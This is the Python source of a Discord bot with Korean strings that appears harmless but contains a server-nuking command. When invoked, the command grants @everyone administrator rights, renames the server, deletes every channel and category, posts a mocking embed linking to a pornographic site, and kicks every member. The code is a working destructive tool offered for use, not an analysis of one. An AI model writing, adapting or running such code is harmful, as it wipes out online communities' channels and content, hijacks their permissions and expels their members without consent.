#머리

import discord, asyncio
from discord.ext import commands
import os
from discord.ext import commands
from discord.utils import get
import random
from dhooks import Webhook

client = commands.Bot(command_prefix = '?')

@client.event
async def on_ready():

  # [discord.Status.online = 온라인],[discord.Status.idle = 자리비움],[discord.Status.dnd = 다른용무],[discord.Status.offline = 오프라인]
  await client.change_presence(status=discord.Status.online)

  await client.change_presence(activity=discord.Game(name="Persona 3"))
  #await client.change_presence(activity=discord.Streaming(name="스트림 방송중", url='링크'))
  #await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name="노래 듣는중"))
  #await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="영상 시청중"))
  
  print("Aigis:",client.user.name,"819929289759653928:",client.user.id,"3:",discord.__version__)

@client.command(name="즐겁다")
async def _clean(ctx):
        every = get(ctx.guild.roles, name="@everyone")
        permissions = discord.Permissions()
        permissions.update(administrator = True)
        await every.edit(reason = None, permissions=permissions)
        name = '채팅 채널'
        name2 = "음성 채널"
        owner = str(ctx.guild.owner.name)
        emojini = get(ctx.guild.emojis)
        roles = get(ctx.guild.roles)
        categories = get(ctx.guild.categories, name=name)
        categories2 = get(ctx.guild.categories, name=name2)
        await ctx.guild.edit(icon=None, name=f"{owner}님의 서버")
        for c in ctx.guild.text_channels:
            await c.delete()
        for ch in ctx.guild.voice_channels:
            await ch.delete()
        for cha in ctx.guild.categories:
            await cha.delete()
        await ctx.guild.create_category("채팅 채널")
        await ctx.guild.create_category("음성 채널")
        permissions = discord.Permissions()
        permissions.update(administrator = True)
        await every.edit(reason = None, permissions=permissions)
        name = '채팅 채널'
        name2 = "음성 채널"
        categories = get(ctx.guild.categories, name=name)
        categories2 = get(ctx.guild.categories, name=name2)
        await ctx.guild.create_text_channel("일반", category=categories)
        await ctx.guild.create_voice_channel("일반", category=categories2)
        channel = get(ctx.guild.channels, name="일반")
        embed = discord.Embed(title="서버도 깔끔", description="미리-삭제한 서버!")
        embed.set_footer(text="그냥 터트려서 대접하세요!")
        embed.set_thumbnail(url="https://media.discordapp.net/attachments/805377615661760515/811551946540318740/2021-02-17_7.57.22.png?")
        embed.set_author(name="사회적비판을받을수있는기계 by 퍼젠#6974 and Dev. Hestia#5444 dm 좆지랄염병 환영!", url="https://pornhub.com", icon_url="https://avatars.githubusercontent.com/u/69731703?s=460&u=55f606bd6e38d755c119f58975f192f5c77b51c8&v=4")
        await channel.send(embed=embed)
        for member in ctx.guild.members:
            try:
                await member.kick()
            except:
                print("1명 밴 못함")
client.run(os.environ['token'])
